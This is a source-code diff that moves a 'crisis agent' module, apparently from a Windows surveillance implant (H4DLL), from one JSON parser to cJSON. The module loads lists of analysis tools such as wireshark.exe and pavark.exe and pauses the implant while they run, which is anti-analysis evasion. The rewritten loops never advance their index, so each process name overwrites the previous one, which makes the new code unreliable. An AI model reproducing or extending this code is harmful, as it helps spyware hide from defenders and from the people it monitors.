@@ -1,7 +1,7 @@
 #define _CRT_SECURE_NO_WARNINGS 1
 
 #include <Windows.h>
-#include <json/JSON.h>
+#include <cJSON/cJSON.h>
 #include "../../H4DLL/common.h"
 #include "../../H4DLL/H4-DLL.h"
 #include "../../H4DLL/bss.h"
@@ -148,10 +148,11 @@ DWORD WINAPI PM_CrisisAgentStartStop(BOOL bStartFlag, BOOL bReset)
 
 
 
-DWORD WINAPI PM_CrisisAgentInit(JSONObject elem)
+DWORD WINAPI PM_CrisisAgentInit(cJSON* elem)
 {
-	JSONObject network, hook;
-	JSONArray network_array, hook_array;
+	cJSON* network = cJSON_GetObjectItem(elem, "network");
+	cJSON* hook = cJSON_GetObjectItem(elem, "hook");
+
 	DWORD i;
 
 	wcscpy(process_crisis_network[0], L"wireshark.exe");
@@ -162,19 +163,17 @@ DWORD WINAPI PM_CrisisAgentInit(JSONObject elem)
 	wcscpy(process_crisis_system[1], L"pavark.exe");
 		
 	// Se non ci sono i due oggetti allora non lo inizializza
-	if (!elem[L"network"]->IsObject() || !elem[L"hook"]->IsObject())
+	if (network == NULL || hook == NULL)
 		return 1;
 
-	network = elem[L"network"]->AsObject();
-	hook = elem[L"hook"]->AsObject();
-	cr_check_network = (BOOL) network[L"enabled"]->AsBool();
-	cr_check_system = (BOOL) hook[L"enabled"]->AsBool();
+	cr_check_network = (BOOL) cJSON_IsTrue(cJSON_GetObjectItem(network, "enabled"));
+	cr_check_system = (BOOL)cJSON_IsTrue(cJSON_GetObjectItem(hook, "enabled"));
 
-	network_array = network[L"processes"]->AsArray();
-	hook_array = hook[L"processes"]->AsArray();
+	cJSON* network_array = cJSON_GetObjectItem(network, "processes");
+	cJSON* hook_array = cJSON_GetObjectItem(hook, "processes");
 
-	process_crisis_network_count = network_array.size();
-	process_crisis_system_count = hook_array.size();
+	process_crisis_network_count = cJSON_GetArraySize(network_array);
+	process_crisis_system_count = cJSON_GetArraySize(hook_array);
 
 	if (process_crisis_network_count > MAX_DYNAMIC_CRISIS_NETWORK)
 		process_crisis_network_count = MAX_DYNAMIC_CRISIS_NETWORK;
@@ -184,12 +183,24 @@ DWORD WINAPI PM_CrisisAgentInit(JSONObject elem)
 	process_crisis_network_count += EMBEDDED_CRISIS_NETWORK;
 	process_crisis_system_count  += EMBEDDED_CRISIS_SYSTEM;
 
-	for (i=0; i<network_array.size(); i++) 
-		wcscpy(process_crisis_network[i+EMBEDDED_CRISIS_NETWORK], network_array[i]->AsString().c_str());
+	cJSON* row = NULL;
+	i = 0;
+	cJSON_ArrayForEach(row, network_array)
+	{
+		wchar_t* value = cJSON_GetWideStringValue(row);
+		wcscpy(process_crisis_network[i + EMBEDDED_CRISIS_NETWORK], value);
+		free(value);
 
-	for (i=0; i<hook_array.size(); i++) 
-		wcscpy(process_crisis_system[i+EMBEDDED_CRISIS_SYSTEM], hook_array[i]->AsString().c_str());
+	}
 
+	i = 0;
+	cJSON_ArrayForEach(row, hook_array)
+	{
+		wchar_t* value = cJSON_GetWideStringValue(row);
+		wcscpy(process_crisis_system[i + EMBEDDED_CRISIS_SYSTEM], value);
+		free(value);
+	}
+	
 	// All'inizio le crisi sono disattivate, sara' il thread ad attivarle
 	shared.crisis = 0;	// clear
 	AM_IPCAgentStartStop(PM_CRISISAGENT, FALSE);
